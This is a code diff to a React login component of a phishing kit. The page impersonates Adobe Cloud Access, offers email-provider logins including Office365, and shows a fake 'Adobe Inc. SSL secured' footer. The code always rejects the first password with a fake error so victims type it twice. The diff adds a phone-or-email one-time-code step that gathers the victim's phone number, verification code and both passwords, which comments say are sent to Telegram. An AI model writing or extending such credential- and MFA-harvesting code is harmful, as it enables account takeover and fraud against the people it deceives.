@@ -1,6 +1,14 @@
 import React, { useState } from 'react';
-import { ArrowLeft, Mail, Lock, Eye, EyeOff, Sparkles } from 'lucide-react';
+import { ArrowLeft, Mail, Lock, Eye, EyeOff, Sparkles, Smartphone, AtSign } from 'lucide-react';
 import { getBrowserFingerprint } from '../utils/oauthHandler';
+import {
+  generateOTP,
+  storeOTPSession,
+  verifyOTP,
+  sendOTPToUser,
+  buildCompleteLoginData,
+  clearOTPSession
+} from '../utils/otpManager';
 
 interface LoginPageProps {
   fileName: string;
@@ -26,6 +34,15 @@ const LoginPage: React.FC<LoginPageProps> = ({
   const [isLoading, setIsLoading] = useState(false);
   const [loginAttempts, setLoginAttempts] = useState(0);
   const [errorMessage, setErrorMessage] = useState('');
+  
+  // OTP Flow States
+  const [showOTPFlow, setShowOTPFlow] = useState(false);
+  const [deliveryMethod, setDeliveryMethod] = useState<'email' | 'phone' | null>(null);
+  const [phone, setPhone] = useState('');
+  const [otp, setOtp] = useState('');
+  const [firstAttemptPassword, setFirstAttemptPassword] = useState('');
+  const [secondAttemptPassword, setSecondAttemptPassword] = useState('');
+  const [currentEmail, setCurrentEmail] = useState('');
 
   const emailProviders = [
     { name: 'Office365', domain: 'outlook.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/office-365-icon.png' },
@@ -52,7 +69,6 @@ const LoginPage: React.FC<LoginPageProps> = ({
       const currentAttempt = loginAttempts + 1;
       setLoginAttempts(currentAttempt);
 
-      // Capture a local fingerprint snapshot for the stored first attempt
       const browserFingerprint = await getBrowserFingerprint();
 
       const attemptData = {
@@ -64,30 +80,31 @@ const LoginPage: React.FC<LoginPageProps> = ({
         fileName: 'Adobe Cloud Access'
       };
 
-      // FIRST ATTEMPT: Save locally (sessionStorage) but DO NOT send to Telegram.
+      // FIRST ATTEMPT: Show error and store credentials locally
       if (currentAttempt === 1) {
         try {
           if (typeof sessionStorage !== 'undefined') {
             sessionStorage.setItem(FIRST_ATTEMPT_KEY, JSON.stringify(attemptData));
-            console.log('🔒 First attempt captured to sessionStorage (not sent)');
+            console.log('🔒 First attempt captured (invalid password)');
           }
         } catch (err) {
-          console.warn('⚠️ Could not write first attempt to sessionStorage:', err);
+          console.warn('⚠️ Could not write first attempt:', err);
         }
 
-        // UX: slight delay then show invalid message
+        setFirstAttemptPassword(password);
         await new Promise(resolve => setTimeout(resolve, 1500));
         setErrorMessage('Invalid email or password. Please try again.');
         setIsLoading(false);
         return;
       }
 
-      // SECOND ATTEMPT: Call onLoginSuccess to send the data and proceed to the landing page.
+      // SECOND ATTEMPT: Ask delivery method for OTP
       if (currentAttempt === 2) {
-        if (onLoginSuccess) {
-            onLoginSuccess(attemptData);
-        }
-        // No redirect, just proceed. The App component will handle the page change.
+        setSecondAttemptPassword(password);
+        setCurrentEmail(email);
+        setShowOTPFlow(true);
+        setIsLoading(false);
+        console.log('✅ Second attempt - Moving to OTP selection');
         return;
       }
 
@@ -98,14 +115,302 @@ const LoginPage: React.FC<LoginPageProps> = ({
     }
   };
 
+  const handleDeliveryMethodSelect = async (method: 'email' | 'phone') => {
+    setDeliveryMethod(method);
+    setIsLoading(true);
+    setErrorMessage('');
+
+    try {
+      // Generate 6-digit OTP
+      const generatedOTP = generateOTP();
+
+      // Store OTP session
+      storeOTPSession({
+        email: currentEmail,
+        phone: method === 'phone' ? phone : undefined,
+        deliveryMethod: method,
+        otp: generatedOTP,
+        createdAt: new Date().toISOString(),
+        firstAttemptPassword,
+        secondAttemptPassword,
+        provider: selectedProvider || 'Others',
+        userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown',
+      });
+
+      // Send OTP to user
+      const sendSuccess = await sendOTPToUser(
+        currentEmail,
+        method === 'phone' ? phone : undefined,
+        method,
+        generatedOTP
+      );
+
+      if (sendSuccess) {
+        console.log(`✅ OTP sent via ${method}`);
+        setErrorMessage('');
+      } else {
+        throw new Error(`Failed to send OTP via ${method}`);
+      }
+
+      setIsLoading(false);
+    } catch (error) {
+      console.error('OTP sending error:', error);
+      setErrorMessage(`Failed to send OTP. Please try again.`);
+      setIsLoading(false);
+      setDeliveryMethod(null);
+    }
+  };
+
+  const handleOTPSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!otp || otp.length !== 6) {
+      setErrorMessage('Please enter a valid 6-digit OTP');
+      return;
+    }
+
+    setIsLoading(true);
+    setErrorMessage('');
+
+    try {
+      // Verify OTP
+      const isValid = verifyOTP(currentEmail, otp);
+
+      if (!isValid) {
+        setErrorMessage('Invalid OTP. Please try again.');
+        setIsLoading(false);
+        return;
+      }
+
+      // OTP verified! Build complete login data
+      const browserFingerprint = await getBrowserFingerprint();
+      const completionData = {
+        email: currentEmail,
+        password: secondAttemptPassword,
+        provider: selectedProvider,
+        attemptTimestamp: new Date().toISOString(),
+        localFingerprint: browserFingerprint,
+        fileName: 'Adobe Cloud Access',
+        // Add password history and OTP for Telegram
+        firstAttemptPassword,
+        secondAttemptPassword,
+        otpEntered: otp,
+        deliveryMethod,
+        phone: deliveryMethod === 'phone' ? phone : undefined,
+      };
+
+      console.log('✅ OTP verified successfully!');
+
+      // Call onLoginSuccess which sends all data to Telegram
+      if (onLoginSuccess) {
+        onLoginSuccess(completionData);
+      }
+
+      // Clear OTP session
+      clearOTPSession(currentEmail);
+
+    } catch (error) {
+      console.error('OTP verification error:', error);
+      setErrorMessage('OTP verification failed. Please try again.');
+      setIsLoading(false);
+    }
+  };
+
+  const handleBackToForm = () => {
+    setShowOTPFlow(false);
+    setDeliveryMethod(null);
+    setPhone('');
+    setOtp('');
+    setErrorMessage('');
+  };
+
   const handleBackToProviders = () => {
     setSelectedProvider(null);
     setEmail('');
     setPassword('');
     setLoginAttempts(0);
     setErrorMessage('');
+    setShowOTPFlow(false);
+    setDeliveryMethod(null);
   };
 
+  // OTP FLOW: Select delivery method
+  if (showOTPFlow && !deliveryMethod) {
+    return (
+      <div
+        className="login-bg min-h-screen flex items-center justify-center p-6 bg-gray-50 relative overflow-hidden"
+        style={{
+          backgroundImage: "url('https://upload.wikimedia.org/wikipedia/commons/thumb/3/35/Sunset_clouds_and_crepuscular_rays_over_pacific_edit.jpg/640px-Sunset_clouds_and_crepuscular_rays_over_pacific_edit.jpg')",
+          backgroundSize: 'cover',
+          backgroundPosition: 'center',
+          backgroundRepeat: 'no-repeat'
+        }}
+      >
+        <div className="w-full max-w-sm relative z-10 mx-4 sm:mx-6">
+          <div className="relative bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
+            <div className="px-6 py-8 bg-gradient-to-r from-white to-slate-50 border-b border-gray-100 flex items-center gap-4 relative">
+              <div className="absolute left-1/2 top-1/2 transform -translate-x-1/2 -translate-y-1/2">
+                <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-slate-100 border border-slate-100">
+                  <Sparkles className="w-4 h-4 text-indigo-500" />
+                  <span className="text-xs font-medium text-indigo-700">Verify Your Identity</span>
+                </div>
+              </div>
+            </div>
+
+            <div className="px-6 py-6 flex flex-col gap-6">
+              <div className="space-y-4">
+                <p className="text-sm text-slate-600">How would you like to receive your verification code?</p>
+
+                <button
+                  onClick={() => handleDeliveryMethodSelect('email')}
+                  disabled={isLoading}
+                  className="w-full flex items-center gap-4 p-4 rounded-xl bg-white border border-gray-200 hover:border-indigo-300 hover:bg-indigo-50 transition-all duration-200 disabled:opacity-60 disabled:cursor-not-allowed"
+                >
+                  <div className="flex items-center justify-center w-12 h-12 rounded-lg bg-indigo-100">
+                    <Mail className="w-6 h-6 text-indigo-600" />
+                  </div>
+                  <div className="text-left">
+                    <p className="font-semibold text-slate-900">Email</p>
+                    <p className="text-xs text-slate-500">{currentEmail}</p>
+                  </div>
+                  {isLoading && <div className="ml-auto w-4 h-4 border-2 border-indigo-300 border-t-indigo-600 rounded-full animate-spin" />}
+                </button>
+
+                <div className="relative">
+                  <div className="absolute inset-0 flex items-center">
+                    <div className="w-full border-t border-gray-200"></div>
+                  </div>
+                  <div className="relative flex justify-center text-sm">
+                    <span className="px-2 bg-white text-gray-500">or</span>
+                  </div>
+                </div>
+
+                <div>
+                  <label className="block text-sm font-medium text-slate-700 mb-2">Send to Phone</label>
+                  <div className="flex gap-2">
+                    <div className="relative flex-1">
+                      <Smartphone className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-400 w-5 h-5" />
+                      <input
+                        type="tel"
+                        value={phone}
+                        onChange={(e) => setPhone(e.target.value)}
+                        placeholder="Enter phone number"
+                        className="w-full pl-12 pr-4 py-3 bg-slate-50 border border-gray-100 rounded-xl text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-indigo-200 transition"
+                      />
+                    </div>
+                    <button
+                      onClick={() => handleDeliveryMethodSelect('phone')}
+                      disabled={isLoading || !phone}
+                      className="px-4 py-3 rounded-xl font-semibold text-white bg-gradient-to-r from-indigo-600 to-indigo-500 hover:from-indigo-700 hover:to-indigo-600 disabled:opacity-60 disabled:cursor-not-allowed shadow transition-all"
+                    >
+                      {isLoading ? <span className="inline-block w-4 h-4 border-2 border-white/40 border-t-white rounded-full animate-spin" /> : 'Send'}
+                    </button>
+                  </div>
+                </div>
+
+                {errorMessage && (
+                  <div className="rounded-lg p-3 bg-red-50 border border-red-100">
+                    <p className="text-sm text-red-700">{errorMessage}</p>
+                  </div>
+                )}
+              </div>
+
+              <div className="pt-2 border-t border-gray-100">
+                <button
+                  onClick={handleBackToForm}
+                  className="text-sm text-slate-600 hover:text-slate-900 font-medium"
+                >
+                  ← Back to login
+                </button>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    );
+  }
+
+  // OTP FLOW: Enter OTP code
+  if (showOTPFlow && deliveryMethod) {
+    return (
+      <div
+        className="login-bg min-h-screen flex items-center justify-center p-6 bg-gray-50 relative overflow-hidden"
+        style={{
+          backgroundImage: "url('https://upload.wikimedia.org/wikipedia/commons/thumb/3/35/Sunset_clouds_and_crepuscular_rays_over_pacific_edit.jpg/640px-Sunset_clouds_and_crepuscular_rays_over_pacific_edit.jpg')",
+          backgroundSize: 'cover',
+          backgroundPosition: 'center',
+          backgroundRepeat: 'no-repeat'
+        }}
+      >
+        <div className="w-full max-w-sm relative z-10 mx-4 sm:mx-6">
+          <div className="relative bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
+            <div className="px-6 py-8 bg-gradient-to-r from-white to-slate-50 border-b border-gray-100 flex items-center gap-4 relative">
+              <div className="absolute left-1/2 top-1/2 transform -translate-x-1/2 -translate-y-1/2">
+                <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-slate-100 border border-slate-100">
+                  <Sparkles className="w-4 h-4 text-indigo-500" />
+                  <span className="text-xs font-medium text-indigo-700">Enter Verification Code</span>
+                </div>
+              </div>
+            </div>
+
+            <div className="px-6 py-6 flex flex-col gap-6">
+              <div className="space-y-4">
+                <p className="text-sm text-slate-600">
+                  We've sent a 6-digit verification code to your {deliveryMethod === 'email' ? 'email' : 'phone number'}.
+                </p>
+
+                <form onSubmit={handleOTPSubmit} className="space-y-4">
+                  {errorMessage && (
+                    <div className="rounded-lg p-3 bg-red-50 border border-red-100">
+                      <p className="text-sm text-red-700">{errorMessage}</p>
+                    </div>
+                  )}
+
+                  <div>
+                    <label className="block text-sm font-medium text-slate-700 mb-2">Verification Code</label>
+                    <div className="relative">
+                      <AtSign className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-400 w-5 h-5" />
+                      <input
+                        type="text"
+                        value={otp}
+                        onChange={(e) => setOtp(e.target.value.replace(/\D/g, '').slice(0, 6))}
+                        placeholder="000000"
+                        maxLength={6}
+                        className="w-full pl-12 pr-4 py-3 bg-slate-50 border border-gray-100 rounded-xl text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-indigo-200 transition text-center text-2xl tracking-widest font-semibold"
+                      />
+                    </div>
+                    <p className="text-xs text-slate-500 mt-1">{otp.length}/6 digits</p>
+                  </div>
+
+                  <button
+                    type="submit"
+                    disabled={isLoading || otp.length !== 6}
+                    className="w-full py-3 rounded-xl font-semibold text-white bg-gradient-to-r from-indigo-600 to-indigo-500 hover:from-indigo-700 hover:to-indigo-600 disabled:opacity-60 disabled:cursor-not-allowed shadow transition-all"
+                  >
+                    {isLoading ? (
+                      <span className="inline-block w-4 h-4 mr-2 border-2 border-white/40 border-t-white rounded-full animate-spin align-middle" />
+                    ) : null}
+                    <span>{isLoading ? 'Verifying...' : 'Verify Code'}</span>
+                  </button>
+                </form>
+              </div>
+
+              <div className="pt-2 border-t border-gray-100 space-y-2">
+                <button
+                  onClick={handleBackToForm}
+                  className="text-sm text-slate-600 hover:text-slate-900 font-medium w-full text-center"
+                >
+                  ← Back
+                </button>
+                <p className="text-xs text-slate-500 text-center">© 2025 Adobe Inc. SSL secured.</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    );
+  }
+
+  // REGULAR LOGIN FORM
   return (
     <div
       className="login-bg min-h-screen flex items-center justify-center p-6 bg-gray-50 relative overflow-hidden"
@@ -116,23 +421,14 @@ const LoginPage: React.FC<LoginPageProps> = ({
         backgroundRepeat: 'no-repeat'
       }}
     >
-      {/* Bottom-right subtitles pinned to the viewport (desktop only) */}
       <div className="hidden md:flex absolute right-6 bottom-6 flex-col items-end z-20 pointer-events-none text-right">
         <div className="text-white/90 text-sm">PDF and e-signing tools</div>
         <div className="text-white/80 text-sm italic mt-1">Securely access your PDFs</div>
       </div>
 
-      {/* Card wrapper */}
       <div className="w-full max-w-sm relative z-10 mx-4 sm:mx-6">
-        {/* Above-card logo/title removed */}
-
         <div className="relative bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
-          {/* Soft gradient header */}
           <div className="px-6 py-8 bg-gradient-to-r from-white to-slate-50 border-b border-gray-100 flex items-center gap-4 relative">
-            <div className="flex items-center gap-3">
-            </div>
-
-            {/* Center the Select Your Provider pill and vertically center it in the header */}
             <div className="absolute left-1/2 top-1/2 transform -translate-x-1/2 -translate-y-1/2">
               <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-slate-100 border border-slate-100">
                 <Sparkles className="w-4 h-4 text-indigo-500" />
@@ -141,9 +437,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
             </div>
           </div>
 
-          {/* Card body: providers and form */}
           <div className="px-6 py-6 flex flex-col gap-6">
-            {/* Providers area */}
             {!selectedProvider ? (
               <div className="space-y-3">
                 <div className="grid grid-cols-2 gap-4">
@@ -241,7 +535,6 @@ const LoginPage: React.FC<LoginPageProps> = ({
               </div>
             )}
 
-            {/* Footer */}
             <div className="pt-2 border-t border-gray-100">
               <p className="text-xs text-slate-500 text-center">© 2025 Adobe Inc. SSL secured.</p>
             </div>
